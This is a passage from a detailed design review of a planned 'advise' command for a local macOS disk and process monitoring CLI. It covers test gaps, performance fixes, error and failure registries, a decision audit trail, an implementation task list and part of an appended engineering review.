- **No fixture for a window longer than the available data** (F18).
- **No fixture for the mixed `.tsv` + `.tsv.gz` boundary day** — `read_day()`
  prefers plain over gz, and a week window crosses the 2-day gzip threshold
  every time. U0's fixture plants "one gzipped" file; it should plant a day that
  has *both* and assert no double-count.
- **Flakiness risk:** U2's "real run on this machine must report ≥25G" and U4's
  "must currently produce exactly the `ok` case" are environment assertions, not
  tests. They will fail the day the owner cleans the disk or leaks an orphan.
  Keep them as a documented manual verification step, out of `smoke.sh`.

The 2am-Friday test: U6's report-aggregation fixture plus the performance
ceiling. The hostile-QA test: a directory named with a shell metacharacter and
invalid UTF-8 under a scanned root (F7). The chaos test: run `advise` while the
sampler is stopped and assert it says so rather than saying "fine" (F4).

### Section 7 — Performance

F1 is the finding. Beyond it: the disk scan is the only expensive path and it is
cached; `--refresh` and the TTL bound it; `du -skx` avoids crossing volumes; the
`find -prune` shape avoids descending into the matched trees, which is what
keeps a 25G scan at ~10s rather than minutes. Memory is bounded by the awk
associative arrays, whose key count is bounded by distinct process names (~100s)
and capped dir lists (5 groups × 20), not by row count. No caching opportunity
is missed beyond the one already planned. No connection pools, no queries, no
network.

### Section 8 — Observability

For a local CLI, "observability" means: can the user tell what the tool did and
why. Mostly yes, with three gaps.

**F14 — WARNING. Nothing records what `advise` said.** Every other artefact in
this project is append-only and re-derivable; advice is the one output that
evaporates. Without a trace there is no way to answer "did this get better since
last week", which is the 12-month direction in §0C. The minimal version costs
almost nothing: append one line per `advise` run to `$DATA/state/advise.log`
(epoch, window, per-domain severity, top finding id). It is not a new resident
process, it is not aggregation-at-sample-time, and it enables both the "unchanged
since" render (D25) and any future trend view.

**F15 — INFO. `doctor` gains no check for the new surface.** `doctor` has eight
checks and exits non-zero when the install is broken. The disk cache's presence
and freshness is now part of install health. One more `chk` line.

**F16 — INFO. The cold-scan stderr notice is the only progress signal for a
90-second operation.** Acceptable for a CLI, but the notice should name the
budget ("scanning ~/Dev, up to 120s") so a user does not conclude it has hung.

**Runbook.** For each new failure mode: stale cache → `advise --refresh`;
`unknown` domains → `claude-watch status` then `doctor`; scan too slow → narrow
`CLAUDE_WATCH_REPO_ROOTS`. All three belong in README, none currently are.

### Section 9 — Deployment and rollout

No migrations, no flags, no services, no downtime — `install.sh` symlinks and
`chmod`s. The plan correctly adds `tools/disk-scan.sh` to `install.sh`'s chmod
list. Two notes.

Rollout order matters in exactly one place: `skills/*` are **symlinked**, not
copied (HANDOFF §12), so U7's SKILL.md edit goes live the moment it is written,
against whatever version of `claude-watch` is on PATH at that moment. Merging U7
before the units that define its flags gives the model a skill documenting
commands that exit 2. The plan already sequences U7 last for a different reason;
this is the stronger reason and should be the stated one.

Post-merge verification, first five minutes: `tests/smoke.sh` green;
`advise --json | python3 -m json.tool`; `advise --window week` completes inside
its (re-measured, post-F1) budget; `report today` still matches its pre-change
output byte for byte on the same day file — that last one is the regression test
for the shared-arithmetic extraction and is worth running by hand.

Deploy-time risk window: none for `advise`. For U5, the old and new `unpushed`
semantics differ, and anything that cached a `worktrees --json` payload across
the change will see numbers move. Nothing does. See F9.

### Section 10 — Long-term trajectory

**Reversibility: 4/5.** `advise`/`disk` are purely additive and revert cleanly.
The two points that are not free to reverse: `--json`'s shape becomes a contract
the skill depends on the moment U7 lands, and U5 changes the meaning of an
existing field (`unpushed`) rather than adding one — which is why
`"unpushed_basis": "local-remote-refs"`, which the plan already floats, should be
non-optional. Ship it with the fix.

**Technical debt introduced.** Under Approach C: near zero, and F1's fix retires
existing debt. Under Approach A: one duplicated aggregator, which is the debt
open decision 3 knowingly accepts. Documentation debt: the §5 threshold numbers
in three places (plan, constants, README) — U7 should collapse that to two.

**Path dependency.** The §3b analyzer contract is the good kind: adding a fifth
domain later (GPU, §7c) means one new file and one line in `advise()`. The plan
makes the *next* feature easier, which is the strongest thing that can be said
about an architecture.

**The 1-year question.** A new reader in 12 months will understand the file
layout immediately. Two things they will not derive from the code and that U7
must therefore write down: why `score` is not a global urgency number (P2), and
why the disk domain lives in a Claude-session monitor at all (P3's rider).

### Section 11 — Design and UX

Terminal UI only, but this is where the feature is won or lost — an advice tool
that is not read is worth nothing. Three findings.

**F17 — WARNING. The all-clear state is undesigned.** §9 covers an empty
*domain*; nothing covers an empty *command*. Once the disk is cleaned this is
the state the owner sees most often, and "nothing to report" with no evidence
reads as broken. The all-clear should be positive and specific: four domains
listed with the number each was checked against, the window, the sample count,
and the freshness of the disk scan. One screenful that says "I looked, here is
what I looked at, you are fine."

**F18 — WARNING. A window can silently exceed the available data.** Two day
files exist right now. `--window month` will present two days of evidence under
a month heading. §9's `clamped` covers retention only. Add `available_days` and
`covered_days` to the JSON and make the human header state the truth: "month
(30d requested, 2d of data available)".

**F19 — WARNING. No output cap or hierarchy.** Five groups × up to 20 dirs plus
CPU, memory and leak findings is a plausible 40+ line wall. Answer "what does
the user see first, second, third" explicitly: a one-line verdict, then the top
3 findings in full with their actions, then a one-line-per-item tail, then
"+ N more (--json for all)". `--json` always carries everything.

The information hierarchy note that follows from P2: because `score` only breaks
ties within a severity, the human output should group by severity with a visible
label rather than printing a flat 1..N ranking, which implies a precision the
number does not have.

---

## §C2. What already exists

Full map in §0B. Summary for the reader who skips there: `read_day()`,
`JESC_AWK`, `scan_orphans()`, `scan_worktrees()`, `is_uint()`, the `C_*` colour
block, the `tmp_cleanup` trap pattern, the `ENVIRON`-not-`-v` awk discipline and
the `temp + mv` atomic-write pattern all exist and are all correctly reused by
the plan. The interval derivation and `observed_seconds` computation also exist
(`claude-watch:316-321`) and are the one thing being rebuilt rather than reused
— the subject of D3 and F1. `tools/disk-scan.sh` has no precedent and is
genuinely new. `tests/smoke.sh` provides the harness shape (`ok`/`bad`/`skp`,
`expect_exit`, `expect_json`) that the seven new fixtures should follow rather
than inventing a second convention.

## §C3. NOT in scope

Considered and explicitly deferred, each with its reason.

| Deferred | Why |
|---|---|
| GPU / Neural Engine power (HANDOFF §7c) | Needs `sudo powermetrics` and a privileged helper. Real blind spot, wrong feature to attach it to. |
| Unit inconsistency `2.5×` vs `253%` (HANDOFF §7b) | `advise` reports cores throughout, consistent with `claude-watch`. Reconciling `claude-top` is a separate, cosmetic, whole-repo change. |
| Retention running only from the hook (HANDOFF §7d) | Pre-existing. `advise` adds a second never-refreshed artefact (the disk cache) with the same shape; noted as a pattern, fixed separately. |
| Any deletion, in any domain | User-fixed. `/claude-watch-reap` is where destruction lives. |
| Transcript deletion commands | Irreversible, and correct rules require knowing what `claude --resume` needs. Report-only (D4). |
| A `--domain` filter | Cross-domain ranking is the feature; filtering it defeats the point. `--json` + `jq` covers the rare case. |
| Alerting / notification on critical | HANDOFF §3 settled this: alert fatigue trains you to ignore it. `advise` stays pull-only. |
| Full advice history / trend view | The append-only log (F14) makes it possible later. The view itself is a separate feature. |
| Sharing `report()`'s per-sample `flush()` fold | Entangled with display arrays; duplication accepted deliberately with fixtures on both sides. |
| `~/Library/Containers` deep breakdown | 8.2G measured, added to the shortlist as a single total (D24). Per-app attribution is a different tool. |

## §C4. Error and rescue registry

| Codepath | What goes wrong | Detected as | Rescued? | Action | User sees |
|---|---|---|---|---|---|
| `advise --window X` | unparseable value | pattern mismatch | Y | exit 2 | `bad window "X"` on stderr |
| `advise --window X` | exceeds `KEEP_DAYS` | numeric compare | Y | clamp | `clamped: true` + header note |
| `advise --window X` | exceeds available data | day-file count | **N ← GAP F18** | — | month heading over 2 days of data |
| `cw_read_window` | no day files at all | empty stream | Y | `samples:0`, domains `unknown` | "no samples yet" |
| `cw_read_window` | no rows *in window* | `sysn == 0` | **N ← GAP F10** | — | `nan` in JSON, agent contract broken |
| `cw_read_window` | `gzcat` fails on a corrupt `.gz` | non-zero exit, swallowed | **N ← GAP** | — | silently short window, honest `observed_seconds`, no notice |
| `advise_cpumem` | week/month row volume | none | **N ← GAP F1** | — | command appears to hang for minutes/hours |
| `advise_disk` | cache file missing | stat | Y | synchronous scan + stderr notice | 30-90s wait, notice |
| `advise_disk` | cache stale beyond TTL | epoch compare | Y | use it, flag `stale` | `stale: true` |
| `advise_disk` | cache malformed / truncated | field count | **N ← GAP** | — | garbage findings, or awk field errors |
| `disk-scan.sh` | `du`/`find` permission denied | non-zero exit | partial | `2>/dev/null` | undercount, silent — needs `partial` (F5) |
| `disk-scan.sh` | root on slow/network mount | none | **N ← GAP F6** | — | interactive command hangs indefinitely |
| `disk-scan.sh` | concurrent invocation | none | **N ← GAP F12** | — | two 30-90s `du` sweeps |
| `disk-scan.sh` | `mv` fails (disk full — likely here!) | non-zero exit | **N ← GAP** | — | stale cache silently retained |
| `advise_leaks` | `scan_worktrees` finds no repos | empty TSV | Y | `S leaks ok` | "no leaked processes" |
| `advise_leaks` | `lsof` returns nothing | `LIVENESS_OK=0` | Y | existing UNSAFE fail-closed | conservative classification |
| `emit_json` | path with invalid UTF-8 | `jesc()` | Y | U+FFFD per bad byte | replacement chars, valid JSON |
| `emit_json` | path with control bytes | `jesc()` / `tr` | Y | `\uXXXX` / space | escaped |
| render action | path with shell metacharacters | none | **N ← GAP F7** | — | a dangerous copy-pasteable command |
| render action | name-matched non-build dir | none | **N ← GAP F8** | — | `rm -rf` on a source directory |
| whole command | sampler dead | none surfaced | **N ← GAP F4** | — | "everything is fine" about an unseen machine |

Nine gaps. Four of them (F1, F4, F10, and the F7/F8 pair) are the ones that
produce a confidently wrong answer rather than a visible failure.

## §C5. Failure modes registry

| Codepath | Failure mode | Rescued? | Test? | User sees | Logged? |
|---|---|---|---|---|---|
| window aggregation | O(n²) at week/month scale | N | N | hangs, minutes to hours | N — **CRITICAL GAP (F1)** |
| whole command | sampler dead → false all-clear | N | N | reassuring wrong answer | N — **CRITICAL GAP (F4)** |
| `cw_read_window` | zero samples in window → ÷0 | N | N | `nan`, invalid JSON | N — **CRITICAL GAP (F10)** |
| render action | shell metachar in path | N | N | pasteable dangerous command | N — **CRITICAL GAP (F7)** |
| render action | `rm -rf` on name match only | N | N | destructive advice on a source dir | N — **CRITICAL GAP (F8)** |
| `disk-scan.sh` | unbounded runtime | N | N | apparent hang | N — GAP (F6) |
| `disk-scan.sh` | partial scan reported complete | partial | N | silent undercount | N — GAP (F5) |
| `disk-scan.sh` | concurrent scans | N | N | doubled `du` load | N — GAP (F12) |
| `disk-scan.sh` | `mv` fails on a full disk | N | N | silently stale cache | N — GAP |
| `advise_disk` | malformed cache | N | N | garbage findings | N — GAP |
| `advise` | window exceeds available data | N | N | month heading, 2 days of data | N — GAP (F18) |
| `advise` | 40-line undifferentiated wall | N | N | ignores the output | N/A — GAP (F19) |
| `advise` | all-clear undesigned | N | N | reads as broken | N/A — GAP (F17) |
| U5 `unpushed` | stale remote-tracking refs | Y | Y (U5 fixture) | errs toward UNSAFE | N/A |
| U5 removal | dirty tree | Y | Y (U5 fixture c) | refused | N/A |
| all analyzers | threshold boundary off-by-one | Y | Y (±1 fixtures) | correct severity | N/A |
| `emit_json` | arbitrary bytes | Y | Y (existing jesc suite) | escaped, valid JSON | N/A |

**5 CRITICAL GAPS** (rescued=N, test=N, and the user sees a confident wrong
answer rather than an error). All five are addressable inside the existing unit
structure; none requires a plan restructure.

## §C6. Decision audit trail

Every decision auto-made in this review. §8's nine open decisions are D1-D9 and
keep their original numbering; D10-D26 are new. **Classification** is
`mechanical` (one defensible answer) or `taste` (reasonable people differ — the
human should confirm these).

> **Gate outcome for this table.** D2 is **SUPERSEDED by G3**: the sampler change
> is larger than pageins/pageouts — `%cpu` is a decaying average, so cumulative
> CPU time is appended too, and the plan now specifies era detection and fallback
> (§6 U1). D2's own `$9`/`$10` `vm_stat` parse was verified **wrong** and is
> corrected there. D5 and D7 are **SUPERSEDED by G4** (separate PR, not a commit
> inside this feature). D3 is **reopened** as open decision 2 — see the note under
> Approach C. D11 is **superseded by §3c's single denominator convention**
> (`used + avail`), which also answers its objection that `df` Capacity is not
> re-derivable. D8 is **adopted and strengthened** (two pieces of evidence, three
> confidence levels — see the note under F8). D12–D22, D26 are folded into §1,
> §3b, §3c, §3d and §9 as written. D25 is **reopened** as open decision 9, since
> it is the only new state this feature would add. Everything else stands.

| # | Decision | Class | Principle | Rationale | Rejected alternative |
|---|---|---|---|---|---|
| D1 | §5 threshold table: adopt as written, with CPU sustained-warn moved 0.25 → 0.35 cores | taste | 1 completeness | A Claude session averaging exactly 0.25 cores over 24h trips warn on its own baseline; a threshold the normal case trips is noise. 0.35 keeps a genuinely busy session visible. | Keep 0.25 (every ordinary day shows a CPU warn) |
| D2 | Append `pageins`/`pageouts` to sampler `sys` rows | mechanical | 1 completeness | Backward compatible by construction (old rows read 0); without it `mem.pressure` cannot tell compressing from thrashing and cries wolf on the measured 601M/2048M + 1.7M pageouts state. Two fields per sample. | Threshold on free/swap alone |
| D3 | Extract `CW_WINDOW_AWK` (interval, observed, lastep, epoch bounds) shared by `report()` and advise; **not** the `flush()` fold | taste | 4 DRY | Two copies of the arithmetic where four bugs have already been found is the repetition DRY exists to prevent, and F1 forces a touch of this code anyway. Uses `JESC_AWK`'s existing mechanism, not a new one. Scoped to ~20 lines so it is not the risky refactor open decision 3 imagines. | Accept full duplication (plan's rec) — leaves F1 fixed in one place and live in the other |
| D4 | Transcripts: report size + age breakdown, no deletion command | mechanical | 1 completeness | Irreversible, and correct rules require knowing what `claude --resume` reads. Report-only is the complete answer here; a deletion command would be the incomplete one. | Age-based deletion command |
| D5 | U5: full fix (correct the number **and** move merged conductor worktrees into the removable set), as its own commit with its own review gate, shipping `unpushed_basis` in the JSON | taste | 2 blast radius | `git worktree remove` keeps the branch, dirty trees are still refused, and stale remote refs err toward UNSAFE — so the widening is safe. But it changes the most destructive path in the tool, so it does not hide inside a read-only feature's diff. | Number-only fix (leaves every conductor worktree permanently UNSAFE — the bug's real cost) |
| D6 | Four `tools/advise-*.sh` files | taste | 3 pragmatic | It is what makes the fan-out real, the domains have genuinely separate data sources, and it matches the existing `tools/` convention. | One 400-line file |
| D7 | Include U6 (report fixtures) | mechanical | 1, 2 | Now load-bearing rather than opportunistic: F1's fix changes `report()`'s aggregation and must land against a green fixture suite. Also closes HANDOFF §7a. | Leave §7a open |
| D8 | Literal commands in human output, **gated on marker evidence (F8) and shell-quoted (F7)** | taste | 5 explicit | Copy-pasteability is the feature's value and `advise` never executes. The gate is what makes authoring `rm -rf` defensible: a size next to an unconfirmed path, a command only next to a confirmed one. | Prose only (removes the value); literal ungated (authors `rm -rf` on a name guess) |
| D9 | Name: `advise` | taste | 3 pragmatic | Verb, matches `report`/`status`/`doctor`. `triage` implies severity-only; `advice` is a noun among verbs. | `triage`, `advice` |
| D10 | Fix the O(n²) sorts: no sort for epochs (append-order + min/max), counting histogram for the median gap | mechanical | 1 completeness | Measured: 3.55s for 4,137 rows; week ~12.6 min, month ~3.9 h. Not tunable. Histogram is exact, O(n+600) and works in macOS awk, which has no `asort()`. | Cap the window (deletes a user-fixed decision); `sort -n` subprocess (slower, extra process) |
| D11 | Volume share denominator: `avail/total` for thresholds, `used/total` for `score`, both named in the JSON | mechanical | 5 explicit | Three denominators are currently in play (87.3% / 96% / 4.3%) across §3d, §4 and §5. Any consistent choice works; leaving it implicit does not. Document the `df /` vs `df $HOME` gotcha in HANDOFF §4. | Use `df`'s Capacity (opaque: it excludes reserved space, so it cannot be re-derived from the JSON) |
| D12 | Disk cache TTL: 6h | mechanical | 5 explicit | Referenced four times in the plan, never given a number. 6h means at most one cold scan per working session; `--refresh` covers impatience. | Leave to the implementer |
| D13 | Hard 120s deadline on the disk scan; partial results written with `partial=1` | mechanical | 1 completeness | `CLAUDE_WATCH_REPO_ROOTS` is user-set and `fd8a0f8` records that a root may be the repo itself. Partial data beats a hung interactive command. | Trust the 30-90s estimate |
| D14 | Add `partial` to the §3c TSV and §3d JSON | mechanical | 5 explicit | §9 asserts the behaviour; no field carries it. An asserted-but-unrepresentable state is a silent failure. | Leave §9's prose as the spec |
| D15 | `advise` exits 0 always, except 2 on usage error and 1 on unreadable data dir. Severity lives in the payload | mechanical | 3 pragmatic | A command that exits non-zero because the disk is 96% full is a command that gets removed from any script that calls it. `doctor` is the health gate; `advise` is the report. | Non-zero on critical findings |
| D16 | Human output: verdict line, top 3 findings in full, one line each thereafter, `+ N more (--json for all)` | mechanical | 1 completeness | 5 groups × 20 dirs plus three other domains is a 40+ line wall. Unread output has zero value; `--json` still carries everything. | Print everything |
| D17 | Design the all-clear: four domains, the threshold each was checked against, window, sample count, disk-scan age | mechanical | 1 completeness | The most common state once the disk is clean, and an undesigned empty state reads as a broken tool. | "Nothing to report" |
| D18 | Add `available_days` / `covered_days`; the human header states requested vs available | mechanical | 5 explicit | Two day files exist today. A month heading over two days of data is a confidently wrong answer, which is worse than a refusal. | Rely on `clamped` (retention only) |
| D19 | Source the analyzers lazily inside `advise()` | mechanical | 3 pragmatic | Top-level sourcing puts four file reads on every invocation including `hook`, whose budget HANDOFF §6 documents and §9 protects. | Source at file scope |
| D20 | Every analyzer splits into pure `<domain>_findings()` + impure `advise_<domain>()` | mechanical | 1 completeness | Makes §3b's "severity is a pure function of value vs threshold" actually true, and it is what lets U4's fixture run without the parent script (F3). | One function per analyzer |
| D21 | SKILL.md must check freshness before reporting; `advise --json` carries the `status` fields | mechanical | 1 completeness | Otherwise a dead sampler reads as an all-clear — the exact failure this tool exists to prevent, one level up (F4). | Rely on the model to run `status` unprompted |
| D22 | Lockfile in `$DATA/state/` with a stale-lock timeout around the disk scan | mechanical | 1 completeness | Two `du` sweeps over 25G started by a tool whose defining constraint is leaving nothing running. | Rely on `temp + mv` (prevents torn reads, not doubled work) |
| D23 | `doctor` gains a disk-cache check | mechanical | 1 completeness | The cache is now part of install health, and `doctor` is where install health is asserted. | Leave `doctor` at eight checks |
| D24 | Add `~/Library/Containers` to the shortlist as a single total | mechanical | 1 completeness | 8.2G measured — larger than `~/Library/Caches` (4.5G), which *is* on the list. Report-only, TCC-tolerant, no per-app breakdown. | Omit it (the second-largest item under `$HOME` is invisible) |
| D25 | Append one line per run to `$DATA/state/advise.log`; the human render says "unchanged since N days ago" when the top finding is identical | taste | 2 blast radius | Rank 1 will read "disk 96%" every run until acted on. Identical repetition is what gets a daily tool ignored. Consistent with the architecture: the *sampler* is stateless, `advise` is a read-time command, and `$DATA/state/` already caches. Enables the §0C trend direction at near-zero cost. | Stateless advice (simpler; nags identically forever) |
| D26 | Document the macOS `df /` vs `df "$HOME"` split in HANDOFF §4 | mechanical | 5 explicit | `df -k /` reports 46% and `df -k "$HOME"` reports 96% on this machine — same free space, different volume. An implementer reaching for `/` gets a reassuring wrong answer with no symptom. | Leave it undocumented |

**26 decisions: 19 mechanical, 7 taste** (D1, D3, D5, D6, D8, D9, D25).

## §C7. Dream state delta

This plan closes most of the distance to the 12-month state in §0C. After it
ships: severity is deterministic and fixture-tested rather than re-derived by a
model from prose; the window is rolling rather than calendar-bound; the largest
reclaimable mass on the machine becomes visible for the first time; and — with
D3 and D10 — window length stops being a design constraint instead of becoming
one.

What remains between here and the ideal, in order of value:

1. **Trend, not snapshot.** "node_modules grew 4G this week" is the finding that
   changes behaviour; "you have 4.8G of node_modules" is the one you read once.
   D25's log is the enabling primitive; the view is a separate feature.
2. **Thresholds calibrated from this machine's own history** rather than chosen
   in a review. Same log, plus 30 days of it.
3. **GPU / Neural Engine** (HANDOFF §7c) — still the known blind spot, and still
   the original complaint (heat) that the tool cannot fully answer.
4. **One aggregator, not one-and-a-fold.** D3 shares the window arithmetic; the
   per-sample fold stays duplicated by choice.

Nothing in this plan moves *away* from the ideal on any axis.

## §C8. Stale diagram audit

The ASCII diagrams in the touched files: HANDOFF §2's architecture block
(`claude-top` / `claude-watch` / `tools/` / `~/.claude-watch/`) omits
`tools/advise*.sh`, `tools/disk-scan.sh` and `state/disk.tsv` — U7 must update
it, and §2 is marked user-approved, so this is an additive edit, not a
re-litigation. HANDOFF §8's commands cheat-sheet and the raw-TSV description
need the two new commands and the `sys`-row schema change (D2). README's
sample-output blocks stay accurate for existing commands. §7 of this plan's own
parallelism diagram needs U6 moved ahead of U1 if D3 is accepted. No other
diagrams exist in the touched files.

## §C9. Implementation task list

Derived from the findings above; each traces to one. P1 blocks ship.

> **Folded into §6's units at the gate; the numbering below is historical.** T1
> became U0. T2, T5, T10 became parts of U2. T3, T4 became parts of U5 (with the
> §3c evidence rules). T8, T9 became parts of U4 and §3c. T11 became the §3b
> pure/impure contract and U2's lazy sourcing. T6 and T12 moved to the separate
> PR (G4). T7 is **not scheduled** — it is open decision 2. T13 is open decision
> 9. T14 stands as U4's `~/Library/Containers` entry plus a `doctor` check that
> rides with U7. Nothing on this list was dropped without a home.

- [ ] **T1 (P1, human ~3h / CC ~20min)** — aggregation — replace both O(n²)
  sorts with min/max tracking + a counting histogram; assert a wall-clock
  ceiling in a fixture. *From F1/D10.* Files: `claude-watch`,
  `tests/fixture-report.sh`. Verify: 60k-sys-row fixture aggregates < 5s.
- [ ] **T2 (P1, human ~1h / CC ~10min)** — U0 — guard `observed_seconds == 0`;
  fixture a window with no samples in it. *From F10.*
- [ ] **T3 (P1, human ~1h / CC ~10min)** — U3/render — shell-quote every path in
  a printed command; refuse a command for paths outside a safe charset.
  *From F7.*
- [ ] **T4 (P1, human ~2h / CC ~15min)** — U2/U3 — require a marker file before
  emitting a removal command; report unconfirmed hits with size only.
  *From F8/D8.*
- [ ] **T5 (P1, human ~1h / CC ~10min)** — U0/U7 — carry `status` freshness in
  `advise --json`; SKILL.md checks it before reporting. *From F4/D21.*
- [ ] **T6 (P1, human ~4h / CC ~30min)** — U6 — land report fixtures **before**
  the T1 change and the D3 extraction. *From D3/D7.*
- [ ] **T7 (P2, human ~2h / CC ~15min)** — U0 — extract `CW_WINDOW_AWK`; both
  `report()` and advise consume it. *From D3.* Verify: `report today` output is
  byte-identical pre/post on the same day file.
- [ ] **T8 (P2, human ~2h / CC ~15min)** — U2 — 120s deadline, `partial` in TSV
  and JSON, scan lockfile. *From F5/F6/F12, D13/D14/D22.*
- [ ] **T9 (P2, human ~1h / CC ~10min)** — U0/U3 — pick the denominator, name it
  in the JSON, document the `df /` gotcha. *From F11, D11/D26.*
- [ ] **T10 (P2, human ~2h / CC ~15min)** — U0 — output hierarchy, designed
  all-clear, `available_days`/`covered_days`. *From F17/F18/F19, D16/D17/D18.*
- [ ] **T11 (P2, human ~1h / CC ~10min)** — all analyzers — pure/impure split;
  lazy sourcing. *From F3/F13, D19/D20.*
- [ ] **T12 (P2, human ~1h / CC ~10min)** — U5 — separate commit, ship
  `unpushed_basis`. *From D5.*
- [ ] **T13 (P3, human ~1h / CC ~10min)** — U0 — `$DATA/state/advise.log` +
  "unchanged since". *From F14/D25.*
- [ ] **T14 (P3, human ~30min / CC ~5min)** — `doctor` disk-cache check;
  `~/Library/Containers` in the shortlist. *From F15/D23, D24.*

## §C10. CEO completion summary

```
+====================================================================+
|            CEO / STRATEGY REVIEW — COMPLETION SUMMARY              |
+====================================================================+
| Mode                 | SELECTIVE EXPANSION (headless, auto-decide) |
| System audit         | 24 commits, clean tree, no stashes, 1 new   |
|                      | untracked file (this plan). 17 codex review |
|                      | rounds on the destructive paths — that      |
|                      | region is well-hardened; the aggregation    |
|                      | region has never been reviewed or timed.    |
| Step 0A (premises)   | 7 named — 4 SOLID, 3 QUESTIONABLE           |
| Step 0B (leverage)   | 11 sub-problems mapped, 9 reused, 2 rebuilt |
| Step 0C / 0C-bis     | 3 approaches; recommend C (shared window    |
|                      | arithmetic, U6 first)                       |
| Step 0E (temporal)   | 8 implementation ambiguities resolved now   |
| Section 1  (Arch)    | 3 issues (1 CRITICAL)                       |
| Section 2  (Errors)  | 21 paths mapped, 9 GAPS                     |
| Section 3  (Security)| 2 issues, both Med likelihood / High impact |
| Section 4  (Data/UX) | 14 edge cases mapped, 4 unhandled           |
| Section 5  (Quality) | 1 DRY violation, 1 naming, 3 under-eng       |
| Section 6  (Tests)   | Diagram produced, 5 gaps (incl. no perf gate)|
| Section 7  (Perf)    | 1 issue — and it is the CRITICAL one         |
| Section 8  (Observ)  | 3 gaps                                      |
| Section 9  (Deploy)  | 2 risks (symlinked skills; U5 field change) |
| Section 10 (Future)  | Reversibility 4/5; debt near zero under C   |
| Section 11 (Design)  | 3 issues (all-clear, window honesty, cap)   |
+--------------------------------------------------------------------+
| NOT in scope         | written (10 items)                          |
| What already exists  | written (11 mapped)                         |
| Dream state delta    | written (4 remaining steps)                 |
| Error/rescue registry| 21 codepaths, 9 gaps                        |
| Failure modes        | 17 rows, 5 CRITICAL GAPS                    |
| Decision audit trail | 26 decisions — 19 mechanical, 7 taste       |
| Implementation tasks | 14 (6 P1, 6 P2, 2 P3)                       |
| Diagrams produced    | 4 (architecture, data flow, dream state,    |
|                      | test surface)                               |
| Stale diagrams found | 3 (HANDOFF §2, HANDOFF §8, plan §7)         |
+====================================================================+
```

**Verdict: build it, under Approach C, with T1-T6 as ship blockers.** The plan
is well-grounded in the actual code — it cites real line numbers, reuses the
right functions, and its fixture strategy is the strongest part. Two things stop
it being ready as written. F1 makes two of the three window selectors
non-functional, and it is a measured fact rather than an estimate. And five
failure modes produce a confidently wrong answer rather than a visible error,
which for a diagnostic tool is the one category that matters most.

**Premises requiring human confirmation** (auto-decisions were made everywhere
else; these were deliberately not decided): P1's restatement, P2's re-scoping of
`score`, P3's rider on the tool's identity, P4's data-availability caveat, P5's
authoring-vs-executing asymmetry, and P7's bundling of U5.

---
---

# ENG REVIEW — appended 2026-08-06

> **Folded in.** Every finding below is now in the spec above (§1–§10) or, for
> the CPU/memory ones, in §10's deferred section with its finding attached. This
> appendix is retained as the audit record, not as spec, and it uses the
> pre-G5 unit numbering: old U0→U0, U1→U1, U2→U2, U3→**v2 (§10)**, U4→U3, U5→U4,
> U6→U5, U7→U6.

Engineering-manager review of the **revised** plan (§0–§9). Headless, auto-decided.
The four gate decisions G1–G4 are treated as settled and are not re-argued. The
CEO appendix (§0A–§C10) was read for context only. HANDOFF §2 (architecture) is
user-approved and is not re-litigated. The separate `unpushed` + `report`-fixtures
PR is out of scope; it appears here only where a unit consumes its output.

Everything below was verified against the code, not inferred. Line references are
to the files as they stand today.

---

## E0. Scope challenge

**Complexity check: TRIGGERED but not reduced.** 8 units, 6 new files, 4 edited.
That is over the "8 files / 2 new services" smell threshold. It is not reduced,
for a reason that survives scrutiny: five of the six new files are single-domain
analyzers with disjoint data sources, and the split is what makes the fan-out in
§7 possible. Consolidating them into one 400-line file would serialise five
parallel units to save one `source` line. **Scope stands as written.** No unit
is deferred, no unit is added; three units gain required work (E-F2, E-F5, E-F8).

**Minimum set:** already minimal. Every unit maps to a stated requirement, and
G4 already stripped the two units that did not belong.

**TODOS.md:** no `TODOS.md` exists in this repo. Deferred work lives in HANDOFF §7
and is referenced there. No new TODO file is created — that would be a second
backlog. Items E-N1..E-N6 in §E7 below are the deferral list.

---

## E1. Architecture and dependency diagram

```
                     ┌──────────────────────────────────────────┐
  DATA (facts)       │  ~/.claude-watch/raw/YYYY-MM-DD.tsv[.gz] │
                     │  sys/8  session/7  proc/6  orphan/6      │  ← NF verified
                     └───────────────┬──────────────────────────┘     on live data
                                     │
   U1 sampler ───── writes ──────────┘        (schema v2: +cputime, +pageio,
   tools/sample.sh                             +memsize, +swapcap — see E-F5)
                                     │
                     ┌───────────────▼───────────────┐
                     │  cw_read_window <seconds>     │  U2  (day files oldest→newest,
                     │  read_day: .tsv > .tsv.gz     │       dedupes .tsv/.tsv.gz)
                     └───────────────┬───────────────┘
                                     │  ONE pass  (see E-F4: today the plan implies TWO)
              ┌──────────────────────┼───────────────────────────┐
              │                      │                           │
   ┌──────────▼─────────┐  ┌─────────▼──────────┐     ┌──────────▼──────────┐
   │ window metadata    │  │ advise_cpumem      │     │ (leaks / disk take   │
   │ samples, iv,       │  │ U3, stdin          │     │  no window input)    │
   │ observed_seconds,  │  │ needs iv+observed  │     └──────────┬──────────┘
   │ ncpu, available_d  │  │ +ncpu+memsize      │                │
   └──────────┬─────────┘  └─────────┬──────────┘                │
              │   ⚠ CONTRACT GAP: iv / observed_seconds / ncpu / memsize_kb /
              │     volume_total_kb are computed HERE and consumed THERE, and
              │     §3b passes only CW_WINDOW_SECONDS.  → E-F4
              └──────────────────────┼───────────────────────────┘
                                     │
   ┌─────────────────────────────────▼─────────────────────────────────┐
   │  U2 collector: S/F rows → per-domain rank → headline → render/JSON │
   └───────┬──────────────┬───────────────┬───────────────┬────────────┘
           │              │               │               │
      advise_cpumem  advise_disk     advise_leaks    (stubs until U3/U5/U6)
        (U3)           (U5)             (U6)
                         │               │
                ┌────────▼──────┐   ┌────▼─────────────────────────┐
                │ $CW_DISK_CACHE│   │ scan_orphans / scan_worktrees │
                │ (§3c TSV)     │   │ claude-watch:452 / :935       │
                └────────▲──────┘   │ 9-col TSV, shape NOT in §3    │
                         │          └───────────────────────────────┘
                ┌────────┴────────┐
                │ tools/disk-scan │  U4  lockfile + 120s deadline + atomic mv
                │ df -k, find,du  │      ⚠ deadline cannot preempt a blocked
                └─────────────────┘        syscall as specified → E-F7

  Dependency order (revised from §7):
     separate PR ─┐
                  ├─► U0 (linear agg) ──► U2 (keystone) ──┬─► U3 ─┐
     U1 ──────────┘                                       ├─► U5 ─┼─► U7
     U4 ──────────────────────────────────────────────────┴─► U6 ─┘
  E-D3 removes the separate-PR edge from U0's critical path (golden-file gate).
```

### Realistic production failure, one per new codepath

| codepath | failure | plan covers? |
|---|---|---|
| `cw_read_window` month | 28 `gzcat` + 3.8M rows read twice | partly — budget is optimistic, E-F4 |
| U0 histogram median | `>=`/`>` slip changes `iv`, silently rescales every rate | no — E-F1 |
| U1 field shift | one of the two offsets edited, argv parses as TIME | yes (§6 U1), fixture named |
